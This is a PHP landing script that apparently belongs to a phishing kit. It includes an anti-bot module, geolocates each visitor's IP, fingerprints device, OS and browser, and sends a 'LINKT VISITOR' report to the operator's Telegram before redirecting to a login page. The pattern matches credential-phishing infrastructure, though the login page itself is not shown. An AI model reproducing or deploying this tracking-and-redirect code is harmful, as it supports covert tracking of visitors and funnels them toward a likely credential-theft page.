<?php
require_once 'config/config.php';
require_once 'onti_bot/security.php';
require_once 'funcsion/functions.php';

// Get visitor IP
$ip = get_client_ip();

// Get country from IP
$country = 'Unknown';
$countryCode = 'XX';
$flagEmoji = '🌐';
$api_url = "http://ip-api.com/json/{$ip}?fields=countryCode,country";
$response = @file_get_contents($api_url);
if ($response) {
    $ip_data = json_decode($response, true);
    if (!empty($ip_data['countryCode']) && strlen($ip_data['countryCode']) >= 2) {
        $countryCode = strtoupper(substr($ip_data['countryCode'], 0, 2));
        $country = $ip_data['country'] ?? $countryCode;
        $flagOffset = 0x1F1E6;
        $asciiOffset = 0x41;
        $c1 = ord($countryCode[0]) - $asciiOffset + $flagOffset;
        $c2 = ord($countryCode[1]) - $asciiOffset + $flagOffset;
        $flagEmoji = mb_chr($c1, 'UTF-8') . mb_chr($c2, 'UTF-8');
    }
}

// Get user agent info
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$device = (stripos($userAgent, 'Mobile') !== false || stripos($userAgent, 'Android') !== false) ? '📱 Mobile' : '💻 Desktop';
$system = stripos($userAgent, 'Android') !== false ? 'Android' :
          (stripos($userAgent, 'Windows') !== false ? 'Windows' :
          (stripos($userAgent, 'iPhone') !== false || stripos($userAgent, 'iPad') !== false ? 'iOS' :
          (stripos($userAgent, 'Mac') !== false ? 'MacOS' :
          (stripos($userAgent, 'Linux') !== false ? 'Linux' : 'Unknown'))));
$browser = stripos($userAgent, 'Edg') !== false ? 'Edge' :
           (stripos($userAgent, 'Chrome') !== false ? 'Chrome' :
           (stripos($userAgent, 'Firefox') !== false ? 'Firefox' :
           (stripos($userAgent, 'Safari') !== false && stripos($userAgent, 'Chrome') === false ? 'Safari' :
           (stripos($userAgent, 'Opera') !== false ? 'Opera' : 'Other'))));

// Get referer
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

// Get date/time
$dateTime = date('Y-m-d H:i:s');

// Build visitor message
$message = "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "    🎬 LINKT VISITOR 🎬\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";
$message .= "🌐 IP Address : {$ip}\n";
$message .= "📍 Location   : {$country} {$flagEmoji}\n";
$message .= "📱 Device     : {$device}\n";
$message .= "💿 System     : {$system}\n";
$message .= "🌍 Browser    : {$browser}\n";
$message .= "⏰ Time       : {$dateTime}\n";
if ($referer !== 'Direct') {
    $message .= "🔗 Referer    : " . (strlen($referer) > 50 ? substr($referer, 0, 47) . '...' : $referer) . "\n";
}
$message .= "\n━━━━━━━━━━━━━━━━━━━━";

// Send visitor notification to Telegram
sendTelegramMessage($message);

// Redirect to login page
header("Location: global/login.php");
exit();
?>